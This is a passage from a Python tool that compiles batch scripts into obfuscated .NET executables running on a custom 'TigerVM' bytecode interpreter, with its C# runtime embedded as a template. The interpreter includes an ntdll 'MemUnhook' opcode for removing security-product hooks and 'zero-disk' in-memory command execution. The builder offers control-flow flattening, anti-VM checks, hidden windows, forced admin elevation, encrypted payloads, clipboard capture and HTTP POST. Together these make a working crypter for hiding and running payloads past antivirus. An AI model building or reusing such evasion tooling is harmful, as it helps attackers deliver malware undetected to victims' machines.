                                if (a4 == "EQU") match = lNum == rNum;
                                else if (a4 == "NEQ") match = lNum != rNum;
                                else if (a4 == "LSS") match = lNum < rNum;
                                else if (a4 == "LEQ") match = lNum <= rNum;
                                else if (a4 == "GTR") match = lNum > rNum;
                                else if (a4 == "GEQ") match = lNum >= rNum;
                            }}
                            else
                            {{
                                int cmp = string.Compare(left, right, sc);
                                if (a4 == "EQU") match = cmp == 0;
                                else if (a4 == "NEQ") match = cmp != 0;
                                else if (a4 == "LSS") match = cmp < 0;
                                else if (a4 == "LEQ") match = cmp <= 0;
                                else if (a4 == "GTR") match = cmp > 0;
                                else if (a4 == "GEQ") match = cmp >= 0;
                            }}
                        }}
                        if (f1) match = !match;
                        {cff_if_match_body}
                        break;
                    case 9: // IfExist
                        string pExp = ExpandVars(a1);
                        bool ex = File.Exists(pExp) || Directory.Exists(pExp);
                        if (f1) ex = !ex;
                        {cff_if_exist_body}
                        break;
                    case 10: // IfDefined
                        string dVar = ExpandVars(a1);
                        bool def = false;
                        lock (_threadLock) {{ def = Variables.ContainsKey(dVar) || Environment.GetEnvironmentVariable(dVar) != null; }}
                        if (f1) def = !def;
                        {cff_if_def_body}
                        break;
                    case 11: // IfErrorLevel
                        bool elOk = _exitCode >= iv;
                        if (f1) elOk = !elOk;
                        {cff_if_el_body}
                        break;
                    case 12: // CallSub
                        string subTarget = ExpandVars(a1).ToLowerInvariant();
                        string subParam = ExpandVars(a2).Trim('\"');
                        if (labels.ContainsKey(subTarget))
                        {{
                            {cff_callsub_body}
                        }}
                        break;
                    case 13: // Return
                        {cff_return_body}
                        break;
                    case 14: // Pause
                        try {{ Console.WriteLine("Press any key to continue . . ."); if (Console.IsInputRedirected) Console.Read(); else Console.ReadKey(true); }} catch {{ }}
                        break;
                    case 15: // Cls
                        try {{ Console.Clear(); }} catch {{ }}
                        break;
                    case 16: // Title
                        try {{ Console.Title = ExpandVars(a1); }} catch {{ }}
                        break;
                    case 17: // Color
                        break;
                    case 18: // Cd
                        try {{ Directory.SetCurrentDirectory(ExpandVars(a1)); }} catch {{ }}
                        break;
                    case 19: // Delay
                        System.Threading.Thread.Sleep(iv);
                        break;
                    case 20: // ExecDirect (In-Memory Zero-Disk Execution)
                        ExecuteDirectProcess(ExpandVars(a1));
                        break;
                    case 21: // PipeStream (Zero-Disk In-Memory Stdin Stream)
                        ExecutePipeStream(ExpandVars(a1));
                        break;
                    case 22: // Exit
                        _exitCode = iv;
                        return;
                    case 23: // ForNumeric
                        string vName = a1;
                        long sVal = EvalMath(a2);
                        long stepVal = EvalMath(a3);
                        string[] a4Parts = (a4 ?? "").Split(new[] {{ '|' }}, 2);
                        long eVal = a4Parts.Length > 0 ? EvalMath(a4Parts[0]) : 0;
                        string loopBody = a4Parts.Length > 1 ? a4Parts[1] : "";
                        for (long cur = sVal; stepVal >= 0 ? cur <= eVal : cur >= eVal; cur += stepVal) {{
                            lock (_threadLock) {{ Variables[vName] = cur.ToString(); }}
                            string expBody = loopBody.Replace("%%" + vName, cur.ToString()).Replace("%" + vName + "%", cur.ToString());
                            {cff_for_num_call}
                        }}
                        break;
                    case 24: // ForFiles
                        string fVar = a1;
                        string rootDir = ExpandVars(a2);
                        string pattern = ExpandVars(a3);
                        string fileBody = a4;
                        SearchOption opt = f1 ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly;
                        if (Directory.Exists(rootDir)) {{
                            foreach (string fp in Directory.GetFiles(rootDir, pattern, opt)) {{
                                lock (_threadLock) {{ Variables[fVar] = fp; }}
                                string expFBody = fileBody.Replace("%%" + fVar, fp).Replace("%" + fVar + "%", fp);
                                {cff_for_file_call}
                            }}
                        }}
                        break;
                    case 25: // ForTokens
                        string tVar = a1;
                        string tOpts = a2;
                        string tSource = ExpandVars(a3).Trim('\"');
                        string tokenBody = a4;
                        string delims = ", \\t";
                        if (tOpts.Contains("delims=")) {{
                            int dIdx = tOpts.IndexOf("delims=");
                            delims = tOpts.Substring(dIdx + 7).Split(' ')[0];
                        }}
                        string[] tokens = tSource.Split(delims.ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                        string expTBody = tokenBody;
                        for (int t = 0; t < tokens.Length; t++) {{
                            char vChar = tVar.Length > 0 ? tVar[0] : 'a';
                            char currentVarName = (char)(vChar + t);
                            lock (_threadLock) {{ Variables[currentVarName.ToString()] = tokens[t]; }}
                            expTBody = expTBody.Replace("%%" + currentVarName, tokens[t]).Replace("%" + currentVarName + "%", tokens[t]);
                        }}
                        {cff_for_token_call}
                        break;
                    case 26: // WinApi (FFI Gateway)
                        string dllName = ExpandVars(a1);
                        string funcName = ExpandVars(a2);
                        string apiArgs = ExpandVars(a3);
                        long apiRes = WinApiGateway.Invoke(dllName, funcName, apiArgs, Variables);
                        lock (_threadLock)
                        {{
                            Variables["API_RESULT"] = apiRes.ToString();
                            Variables["WINAPI_RESULT"] = apiRes.ToString();
                            Variables["ERRORLEVEL"] = apiRes.ToString();
                        }}
                        _exitCode = (int)apiRes;
                        break;
                    case 27: // ThreadStart (Multithreading)
                        string tLabel = ExpandVars(a1).ToLowerInvariant();
                        if (labels.ContainsKey(tLabel))
                        {{
                            int targetIp = labels[tLabel];
                            System.Threading.Thread worker = new System.Threading.Thread(() =>
                            {{
                                ExecuteSubRoutineThread(targetIp, instrs, labels);
                            }});
                            worker.IsBackground = true;
                            lock (_threadLock) {{ _activeThreads.Add(worker); }}
                            worker.Start();
                        }}
                        break;
                    case 28: // ThreadWait
                        List<System.Threading.Thread> threadsToWait;
                        lock (_threadLock)
                        {{
                            threadsToWait = new List<System.Threading.Thread>(_activeThreads);
                            _activeThreads.Clear();
                        }}
                        foreach (var t in threadsToWait)
                        {{
                            if (t != null && t.IsAlive) t.Join();
                        }}
                        break;
                    case 29: // VFSRead
                        string vFile = ExpandVars(a1);
                        string vDest = ExpandVars(a2);
                        lock (_threadLock)
                        {{
                            if (EmbeddedFiles.ContainsKey(vFile))
                            {{
                                try
                                {{
                                    byte[] bData = Convert.FromBase64String(EmbeddedFiles[vFile]);
                                    Variables[vDest] = Encoding.UTF8.GetString(bData);
                                }}
                                catch {{ Variables[vDest] = ""; }}
                            }}
                            else
                            {{
                                Variables[vDest] = "";
                            }}
                        }}
                        break;
                    case 30: // VFSWrite
                        string vwFile = ExpandVars(a1);
                        string vwContent = ExpandVars(a2);
                        lock (_threadLock)
                        {{
                            EmbeddedFiles[vwFile] = Convert.ToBase64String(Encoding.UTF8.GetBytes(vwContent));
                        }}
                        break;
                    case 31: // HudBanner
                        TigerHud.RenderBanner(ExpandVars(a1), ExpandVars(a2));
                        break;
                    case 32: // HudProgress
                        int pNum = 50;
                        int.TryParse(ExpandVars(a1), out pNum);
                        TigerHud.RenderProgress(pNum, ExpandVars(a2));
                        break;
                    case 33: // HudMatrix
                        TigerHud.RenderMatrix(iv > 0 ? iv : 25);
                        break;
                    case 34: // MemUnhook
                        TigerArmor.ReloadPristineNtdll();
                        break;
                    case 35: // GUIMsgBox
                        string mbTitle = ExpandVars(a1);
                        string mbBody = ExpandVars(a2);
                        string mbOpts = a3;
                        string mbResVar = a4;
                        string mbRes = TigerGui.ShowMsgBox(mbTitle, mbBody, mbOpts);
                        lock (_threadLock)
                        {{
                            Variables[mbResVar] = mbRes;
                            Variables["MSGBOX_RESULT"] = mbRes;
                            Environment.SetEnvironmentVariable(mbResVar, mbRes);
                        }}
                        break;
                    case 36: // GUIInputBox
                        string ibVar = a1;
                        string ibPrompt = ExpandVars(a2);
                        string ibDefault = ExpandVars(a3);
                        string ibTitle = ExpandVars(a4);
                        string ibRes = TigerGui.ShowInputBox(ibPrompt, ibDefault, ibTitle);
                        lock (_threadLock)
                        {{
                            Variables[ibVar] = ibRes;
                            Variables["INPUT_RESULT"] = ibRes;
                            Environment.SetEnvironmentVariable(ibVar, ibRes);
                        }}
                        break;
                    case 37: // GUIFileDialog
                        string fdVar = a1;
                        string fdTitle = ExpandVars(a2);
                        string fdFilter = a3;
                        string fdMode = a4;
                        string fdRes = TigerGui.ShowFileDialog(fdTitle, fdFilter, fdMode);
                        lock (_threadLock)
                        {{
                            Variables[fdVar] = fdRes;
                            Variables["FILE_RESULT"] = fdRes;
                            Environment.SetEnvironmentVariable(fdVar, fdRes);
                        }}
                        break;
                    case 38: // HttpGet
                        string hgVar = a1;
                        string hgUrl = ExpandVars(a2);
                        int hgTimeout = iv > 0 ? iv : 10000;
                        string hgRes = TigerHttp.Get(hgUrl, hgTimeout);
                        lock (_threadLock)
                        {{
                            Variables[hgVar] = hgRes;
                            Variables["HTTP_RESPONSE"] = hgRes;
                            Environment.SetEnvironmentVariable(hgVar, hgRes);
                        }}
                        break;
                    case 39: // HttpPost
                        string hpVar = a1;
                        string hpUrl = ExpandVars(a2);
                        string hpPayload = ExpandVars(a3);
                        string hpType = ExpandVars(a4);
                        int hpTimeout = iv > 0 ? iv : 10000;
                        string hpRes = TigerHttp.Post(hpUrl, hpPayload, hpType, hpTimeout);
                        lock (_threadLock)
                        {{
                            Variables[hpVar] = hpRes;
                            Variables["HTTP_RESPONSE"] = hpRes;
                            Environment.SetEnvironmentVariable(hpVar, hpRes);
                        }}
                        break;
                    case 40: // Notify Toast
                        string ntTitle = ExpandVars(a1);
                        string ntMsg = ExpandVars(a2);
                        string ntIcon = a3;
                        int ntSec = iv > 0 ? iv : 5;
                        TigerNotify.ShowToast(ntTitle, ntMsg, ntSec, ntIcon);
                        break;
                    case 41: // JsonGet
                        string jgVar = a1;
                        string jgSrc = ExpandVars(a2);
                        lock (_threadLock) {{ if (Variables.ContainsKey(a2)) jgSrc = Variables[a2]; }}
                        string jgPath = ExpandVars(a3);
                        string jgVal = TigerData.JsonGet(jgSrc, jgPath);
                        lock (_threadLock)
                        {{
                            Variables[jgVar] = jgVal;
                            Variables["JSON_RESULT"] = jgVal;
                            Environment.SetEnvironmentVariable(jgVar, jgVal);
                        }}
                        break;
                    case 42: // JsonSet
                        string jsDestVar = a1;
                        string jsSrcJson = ExpandVars(a2);
                        lock (_threadLock) {{ if (Variables.ContainsKey(a2)) jsSrcJson = Variables[a2]; }}
                        string jsPath = ExpandVars(a3);
                        string jsVal = ExpandVars(a4);
                        string jsNewJson = TigerData.JsonSet(jsSrcJson, jsPath, jsVal);
                        lock (_threadLock)
                        {{
                            Variables[jsDestVar] = jsNewJson;
                            Variables["JSON_RESULT"] = jsNewJson;
                            Environment.SetEnvironmentVariable(jsDestVar, jsNewJson);
                        }}
                        break;
                    case 43: // SqlExec
                        TigerData.SqlExec(ExpandVars(a1));
                        break;
                    case 44: // SqlQuery
                        string sqVar = a1;
                        string sqQuery = ExpandVars(a2);
                        string sqRes = TigerData.SqlQuery(sqQuery);
                        lock (_threadLock)
                        {{
                            Variables[sqVar] = sqRes;
                            Variables["SQL_RESULT"] = sqRes;
                            Environment.SetEnvironmentVariable(sqVar, sqRes);
                        }}
                        break;
                    case 45: // ClipGet
                        string cgVar = a1;
                        string cgText = TigerData.ClipGet();
                        lock (_threadLock)
                        {{
                            Variables[cgVar] = cgText;
                            Variables["CLIP_RESULT"] = cgText;
                            Environment.SetEnvironmentVariable(cgVar, cgText);
                        }}
                        break;
                    case 46: // ClipSet
                        TigerData.ClipSet(ExpandVars(a1));
                        break;
                    case 47: // Crypto AES (Enc / Dec)
                        string crVar = a1;
                        string crData = ExpandVars(a2);
                        lock (_threadLock) {{ if (Variables.ContainsKey(a2)) crData = Variables[a2]; }}
                        string crPass = ExpandVars(a3);
                        string crRes = (a4 == "DEC") ? TigerCrypto.AesDecrypt(crData, crPass) : TigerCrypto.AesEncrypt(crData, crPass);
                        lock (_threadLock)
                        {{
                            Variables[crVar] = crRes;
                            Variables["CRYPTO_RESULT"] = crRes;
                            Environment.SetEnvironmentVariable(crVar, crRes);
                        }}
                        break;
                    case 48: // Crypto Hash / Base64
                        string chVar = a1;
                        string chData = ExpandVars(a2);
                        lock (_threadLock) {{ if (Variables.ContainsKey(a2)) chData = Variables[a2]; }}
                        string chMode = a3;
                        string chRes = "";
                        if (chMode == "SHA256") chRes = TigerCrypto.ComputeSha256(chData);
                        else if (chMode == "MD5") chRes = TigerCrypto.ComputeMd5(chData);
                        else if (chMode == "B64_ENC") chRes = TigerCrypto.Base64Encode(chData);
                        else if (chMode == "B64_DEC") chRes = TigerCrypto.Base64Decode(chData);
                        lock (_threadLock)
                        {{
                            Variables[chVar] = chRes;
                            Variables["HASH_RESULT"] = chRes;
                            Environment.SetEnvironmentVariable(chVar, chRes);
                        }}
                        break;
                    case 49: // TryStart
                        int catchIp = -1; int endTryIp = -1;
                        for (int searchIp = ip + 1; searchIp < instrs.Count; searchIp++)
                        {{
                            if (instrs[searchIp].Op == 50 && catchIp == -1) catchIp = searchIp;
                            if (instrs[searchIp].Op == 51 && endTryIp == -1) {{ endTryIp = searchIp; break; }}
                        }}
                        string errVar = !string.IsNullOrEmpty(a1) ? a1 : "ERROR_MSG";
                        tryStack.Push(new int[] {{ catchIp, endTryIp, catchIp != -1 ? instrs[catchIp].StateId : 0, endTryIp != -1 ? instrs[endTryIp].StateId : 0 }});
                        errVarStack.Push(errVar);
                        break;
                    case 50: // Catch
                        if (tryStack.Count > 0)
                        {{
                            int[] frame = tryStack.Pop();
                            errVarStack.Pop();
                            {cff_catch_skip}
                        }}
                        break;
                    case 51: // EndTry
                        if (tryStack.Count > 0) {{ tryStack.Pop(); errVarStack.Pop(); }}
                        break;
                    case 52: // HudTable
                        TigerHud.RenderTable(ExpandVars(a1));
                        break;
                    case 53: // HudSpinner
                        int sMs = 1000; int.TryParse(ExpandVars(a1), out sMs);
                        TigerHud.RenderSpinner(sMs > 0 ? sMs : 1000, ExpandVars(a2));
                        break;
                    case 54: // VfsList
                        string vlDest = a1;
                        lock (_threadLock)
                        {{
                            string[] keys = new string[EmbeddedFiles.Keys.Count];
                            EmbeddedFiles.Keys.CopyTo(keys, 0);
                            string vfsListStr = string.Join(", ", keys);
                            Variables[vlDest] = vfsListStr;
                            Variables["VFS_LIST"] = vfsListStr;
                            Environment.SetEnvironmentVariable(vlDest, vfsListStr);
                        }}
                        break;
                }}
                {cff_loop_end}
        }}

        private static string CleanBodyString(string body)
        {{
            if (string.IsNullOrEmpty(body)) return "";
            body = body.Trim();
            while (body.StartsWith("(") && body.EndsWith(")"))
            {{
                body = body.Substring(1, body.Length - 2).Trim();
            }}
            char[] trims = new[] {{ '&', ' ', '\\r', '\\n', '\\t' }};
            return body.Trim(trims);
        }}

        private static List<string> SplitSubCommands(string cmd)
        {{
            List<string> list = new List<string>();
            if (string.IsNullOrEmpty(cmd)) return list;
            StringBuilder sb = new StringBuilder();
            bool inQuotes = false;
            for (int i = 0; i < cmd.Length; i++)
            {{
                char c = cmd[i];
                if (c == '\"') {{ inQuotes = !inQuotes; sb.Append(c); }}
                else if (c == '^' && i + 1 < cmd.Length) {{ sb.Append(c); sb.Append(cmd[++i]); }}
                else if (c == '&' && !inQuotes)
                {{
                    if (i + 1 < cmd.Length && cmd[i + 1] == '&') i++;
                    string part = sb.ToString().Trim();
                    if (!string.IsNullOrEmpty(part)) list.Add(part);
                    sb.Length = 0;
                }}
                else
                {{
                    sb.Append(c);
                }}
            }}
            string last = sb.ToString().Trim();
            if (!string.IsNullOrEmpty(last)) list.Add(last);
            return list;
        }}

        {subcmd_sig}
        {{
            cmd = cmd.Trim();
            if (string.IsNullOrEmpty(cmd)) return;
            List<string> subCmds = SplitSubCommands(cmd);
            foreach (string c in subCmds)
            {{
                string sc = CleanBodyString(c);
                if (string.IsNullOrEmpty(sc)) continue;
                if (sc.StartsWith("echo ", StringComparison.OrdinalIgnoreCase))
                {{
                    Console.WriteLine(ExpandVars(sc.Substring(5)));
                }}
                else if (sc.StartsWith("set /a ", StringComparison.OrdinalIgnoreCase))
                {{
                    string expr = sc.Substring(7).Trim().Trim('\"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1) {{ lock (_threadLock) {{ Variables[expr.Substring(0, eq).Trim()] = EvalMath(expr.Substring(eq + 1)).ToString(); }} }}
                }}
                else if (sc.StartsWith("set ", StringComparison.OrdinalIgnoreCase))
                {{
                    string expr = sc.Substring(4).Trim().Trim('\"');
                    int eq = expr.IndexOf('=');
                    if (eq != -1) {{ lock (_threadLock) {{ Variables[expr.Substring(0, eq).Trim()] = ExpandVars(expr.Substring(eq + 1)); }} }}
                }}
                else if (sc.StartsWith("goto ", StringComparison.OrdinalIgnoreCase))
                {{
                    string tgt = ExpandVars(sc.Substring(5).Trim().TrimStart(':')).ToLowerInvariant();
                    if (tgt == "eof") {{ Environment.Exit(_exitCode); }}
                    {subcmd_goto}
                }}
                else if (sc.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
                {{
                    Match m = Regex.Match(sc, @"exit(?:\\s+/b)?(?:\\s+(\\d+))?", RegexOptions.IgnoreCase);
                    _exitCode = (m.Success && m.Groups[1].Success) ? int.Parse(m.Groups[1].Value) : 0;
                    Environment.Exit(_exitCode);
                }}
                else
                {{
                    ExecuteDirectProcess(ExpandVars(sc));
                }}
            }}
        }}

        private static void ExecuteDirectProcess(string cmdLine)
        {{
            cmdLine = cmdLine.Trim();
            if (string.IsNullOrEmpty(cmdLine)) return;
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmdLine;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = {create_no_window};
                psi.WindowStyle = {show_window_code};
                using (Process proc = Process.Start(psi))
                {{
                    if (proc != null)
                    {{
                        proc.WaitForExit();
                        _exitCode = proc.ExitCode;
                    }}
                }}
            }}
            catch
            {{
                _exitCode = 1;
            }}
        }}

        private static void ExecutePipeStream(string rawCmd)
        {{
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/q";
                psi.UseShellExecute = false;
                psi.RedirectStandardInput = true;
                psi.CreateNoWindow = {create_no_window};
                psi.WindowStyle = {show_window_code};
                using (Process proc = Process.Start(psi))
                {{
                    if (proc != null)
                    {{
                        proc.StandardInput.WriteLine(rawCmd);
                        proc.StandardInput.WriteLine("exit");
                        proc.StandardInput.Close();
                        proc.WaitForExit();
                        _exitCode = proc.ExitCode;
                    }}
                }}
            }}
            catch
            {{
                _exitCode = 1;
            }}
        }}
    }}
}}
"""
    return cs_code


def compile_batch_to_exe(
    input_bat_path: str,
    output_exe_path: str,
    hidden: bool = False,
    require_admin: bool = False,
    armor: bool = True,
    cff: bool = True,
    anti_vm: bool = False,
    icon_path: Optional[str] = None,
    embed_files: Optional[List[str]] = None,
    metadata: Optional[Dict[str, str]] = None,
    jit: bool = True,
    unhook: bool = True,
    cyberpunk: bool = False,
) -> bool:
    """
    Compiles a batch file into a standalone TigerVM v6.0-ULTRA Zero-Disk executable.
    """
    csc = find_csc_compiler()
    if not csc:
        raise RuntimeError(
            "CSC compiler (csc.exe) not found on this system. "
            "Please ensure Microsoft .NET Framework is installed."
        )

    if not os.path.exists(input_bat_path):
        raise FileNotFoundError(f"Input batch file not found: {input_bat_path}")

    # Read batch script
    with open(input_bat_path, "r", encoding="utf-8", errors="replace") as f:
        script_content = f.read()

    # Compile into TigerVM Bytecode
    bytecode, opcode_map, key, sha256_seal = TigerVMCompiler.compile_bytecode(script_content, enable_cff=cff, optimize=True)
    b64_bytecode = base64.b64encode(bytecode).decode("ascii")
    b64_key = base64.b64encode(key).decode("ascii")

    # Read embedded files
    embedded_data = {}
    if embed_files:
        for fpath in embed_files:
            if os.path.exists(fpath):
                fname = os.path.basename(fpath)
                with open(fpath, "rb") as ef:
                    embedded_data[fname] = base64.b64encode(ef.read()).decode("ascii")
            else:
                print(f"Warning: Embedded file not found, skipping: {fpath}")

    meta = metadata or {}
    cs_source = generate_csharp_source(
        b64_bytecode=b64_bytecode,
        b64_key=b64_key,
        sha256_seal=sha256_seal,
        opcode_map=opcode_map,
        hidden=hidden,
        enable_armor=armor,
        enable_cff=cff,
        enable_anti_vm=anti_vm,
        embedded_files=embedded_data,
        metadata=meta,
        enable_jit=jit,
        enable_unhook=unhook,
        enable_cyberpunk=cyberpunk,
    )

    # Temporary directory for building
    with tempfile.TemporaryDirectory() as tmp_dir:
        cs_file = os.path.join(tmp_dir, "App.cs")
        manifest_file = os.path.join(tmp_dir, "app.manifest")

        with open(cs_file, "w", encoding="utf-8") as f:
            f.write(cs_source)

        with open(manifest_file, "w", encoding="utf-8") as f:
            f.write(generate_manifest(require_admin))

        target_type = "winexe" if hidden else "exe"
        cmd = [
            csc,
            "/nologo",
            "/optimize+",
            f"/target:{target_type}",
            "/r:System.Data.dll",
            "/r:System.Windows.Forms.dll",
            "/r:System.Drawing.dll",
            f"/out:{os.path.abspath(output_exe_path)}",
            f"/win32manifest:{manifest_file}",
        ]

        if icon_path and os.path.exists(icon_path):
            cmd.append(f"/win32icon:{os.path.abspath(icon_path)}")

        cmd.append(cs_file)

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print("CSC Compilation failed:")
            print(result.stdout)
            print(result.stderr)
            return False

    return True
